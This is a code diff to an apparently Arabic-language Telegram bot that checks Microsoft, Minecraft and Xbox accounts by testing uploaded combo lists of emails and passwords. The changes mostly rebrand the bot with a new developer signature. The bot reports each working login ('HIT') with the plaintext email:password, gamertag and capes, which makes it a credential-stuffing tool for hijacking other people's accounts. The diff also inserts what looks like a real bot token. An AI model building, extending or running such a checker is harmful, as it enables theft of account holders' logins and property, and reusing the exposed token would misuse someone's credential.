@@ -12,11 +12,11 @@ from telebot import types
 urllib3.disable_warnings()
 
 # ══════════════════════════════════════════════
-# إعدادات البوت والقناة
-BOT_TOKEN = "ضع_توكن_البوت_هنا"
-CHANNEL_USERNAME = "@r1iv_k"  # قناة الاشتراك الإجباري المحدثة
+# إعدادات البوت والقناة والحقوق
+BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
+CHANNEL_USERNAME = "@r1iv_k"  # قناة الاشتراك الإجباري
 WELCOME_VIDEO_URL = "https://t.me/QuatrHuit/2"
-MY_SIGNATURE = "@pypkg"
+MY_SIGNATURE = "@r1ivk"  # حقوق البرمجة والأونر باسمك
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
@@ -367,7 +367,7 @@ def check_account(combo, chat_id):
                 stats.not_linked += 1; stats.hits += 1; stats.checked += 1
             capture = f"Email: {email} | Pass: {password} | Gamertag: {gamertag} | Type: Not Linked"
             save_hit("not_linked", capture)
-            bot.send_message(chat_id, f"🔓 <b>HIT (Not Linked)!</b>\n<code>{email}:{password}</code>\nGamertag: {gamertag}")
+            bot.send_message(chat_id, f"🔓 <b>HIT (Not Linked)!</b>\n<code>{email}:{password}</code>\nGamertag: {gamertag}\n\n⚡️ Developer: {MY_SIGNATURE}")
             return
 
         profile = get_profile(session, mc_token)
@@ -396,7 +396,8 @@ def check_account(combo, chat_id):
             f"📧 <code>{email}:{password}</code>\n"
             f"⛏ MC Name: {name}\n"
             f"🎭 Capes: {capes}\n"
-            f"🎮 Gamertag: {gamertag}"
+            f"🎮 Gamertag: {gamertag}\n\n"
+            f"⚡️ Developer: {MY_SIGNATURE}"
         )
         bot.send_message(chat_id, hit_msg)
 
@@ -420,7 +421,8 @@ def send_welcome(message):
         "🎮 <b>مرحباً بك في بوت فحص حسابات مايكروسوفت و ماينكرافت</b>\n\n"
         "📁 <b>طريقة الاستخدام:</b>\n"
         "• قم بإرسال ملف الكومبو بصيغة <code>.txt</code> وسيبدأ الفحص تلقائياً.\n\n"
-        f"📢 القناة: {CHANNEL_USERNAME}"
+        f"📢 القناة: {CHANNEL_USERNAME}\n"
+        f"🛠️ Developer / Owner: {MY_SIGNATURE}"
     )
     try:
         bot.send_video(message.chat.id, WELCOME_VIDEO_URL, caption=welcome_text)
@@ -473,7 +475,7 @@ def handle_document(message):
     clear_results()
     stats.reset()
 
-    msg = bot.send_message(message.chat.id, f"🚀 <b>جاري بدء الفحص لـ {total} حساب...</b>")
+    bot.send_message(message.chat.id, f"🚀 <b>جاري بدء الفحص لـ {total} حساب...</b>\n\n🛠️ By: {MY_SIGNATURE}")
 
     def run_checker():
         with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
@@ -493,14 +495,15 @@ def handle_document(message):
             f"⛏ ماينكرافت: {stats.minecraft}\n"
             f"🎮 جيم باس: {stats.gamepass}\n"
             f"🕹 إكس بوكس: {stats.xbox}\n"
-            f"🔓 غير مرتبط: {stats.not_linked}"
+            f"🔓 غير مرتبط: {stats.not_linked}\n\n"
+            f"🛠️ Dev: {MY_SIGNATURE}"
         )
         bot.send_message(message.chat.id, final_text)
 
         for cat, path in FILE_MAP.items():
             if os.path.exists(path) and os.path.getsize(path) > 0:
                 with open(path, 'rb') as doc:
-                    bot.send_document(message.chat.id, doc, caption=f"📁 نتائج {cat}")
+                    bot.send_document(message.chat.id, doc, caption=f"📁 نتائج {cat}\n🛠️ {MY_SIGNATURE}")
                 time.sleep(0.5)
 
     threading.Thread(target=run_checker, daemon=True).start()
